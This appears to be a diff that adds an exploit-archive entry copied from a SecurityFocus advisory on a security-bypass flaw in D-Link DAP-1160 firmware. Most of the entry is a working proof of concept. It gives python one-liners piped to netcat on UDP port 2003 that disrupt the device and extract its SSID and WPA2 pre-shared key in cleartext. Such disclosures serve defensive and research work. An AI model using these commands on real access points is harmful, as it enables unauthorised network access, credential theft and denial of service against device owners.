@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/41187/info
+
+The D-Link DAP-1160 wireless access point (WAP) is prone to a security-bypass vulnerability.
+
+Remote attackers can exploit this issue to bypass security restrictions, access certain administrative functions, alter configuration, or trigger a denial-of-service condition.
+
+D-Link DAP-1160 running firmware v120b06, v130b10, and v131b01 are vulnerable. 
+
+python -c 'print "\x05" + "\x00" * 7' | nc -u <IP_ADDR> 2003
+
+python -c 'print "\x03" + "\x00" * 7 + "\x21\x27\x00"' | nc -o ssid.txt -u <IP_ADDR> 2003
+cat ssid.txt
+(cleartext SSID displayed after "21 27 xx xx" in the received datagram)
+
+python -c 'print "\x03" + "\x00" * 7 + "\x23\x27\x00\x00\x24\x27\x00"' | nc -u -o pass.txt <IP_ADDR> 2003
+cat pass.txt
+(cleartext WPA2 PSK displayed after "24 27 xx xx" in the received datagram)
+
+
